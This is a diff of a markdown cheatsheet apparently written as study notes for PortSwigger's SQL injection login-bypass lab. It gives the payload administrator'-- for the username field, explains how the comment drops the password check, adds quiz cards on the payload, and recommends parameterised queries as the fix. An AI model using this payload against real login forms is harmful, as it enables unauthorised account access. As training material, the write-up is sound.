@@ -1,14 +1,51 @@
 ---
 title: "Portswigger SQL Injection Lab 2"
-date: "2025-05-31T12:17:20+05:45"
-excerpt: "SQL injection vulnerability allowing login bypass"
-tags: []
+date: '2026-06-22'
+excerpt: "PortSwigger login bypass lab where the username field breaks out of its query string and comments out the password check, so the password can be anything."
+tags: ["SQL Injection", "PortSwigger", "Web Security", "authentication"]
 category: "Web Security"
 type: "cheatsheet"
 ---
 
-## Lab: [](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass)
+# Portswigger SQL Injection Lab 2
 
-> This lab contains a SQL injection vulnerability in the login function.
-	To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
+The login form drops your input straight into the query, so the username field can close the string and comment out the password check.
 
+## The vulnerable query
+
+```sql
+SELECT * FROM users WHERE username = 'administrator' AND password = 'password'
+```
+
+## The payload
+
+Username:
+
+```text
+administrator'--
+```
+
+Password: anything you like, even blank.
+
+The query becomes:
+
+```sql
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+```
+
+The `--` comments out the password check, so the WHERE clause is just `username = 'administrator'` and the login succeeds.
+
+## Why it works
+
+The `'` closes the username string and `--` turns the rest of the line into a comment. The database never evaluates the password condition, so it only has to match a row named `administrator`.
+
+## The fix
+
+Parameterise the query so the username and password are bound as values, not concatenated into the SQL string.
+
+<Cloze title="Payload recall" text="Put administrator{{'--}} in the username box, leave the password blank, and the query logs you in as admin." />
+
+<QuizCard title="Login bypass" color="#ff2d95" questions={[
+  { question: "What goes in the username field?", options: ["administrator'--", "administrator''", "' OR '1'='1", "admin--'"], correct: 0, explanation: "administrator'-- closes the username string and comments out the trailing password check." },
+  { question: "What did the injected comment remove from the query?", options: ["The password check", "The username check", "The table name", "The WHERE clause"], correct: 0, explanation: "Everything after -- is ignored, so the AND password = '' condition never runs." }
+]} />
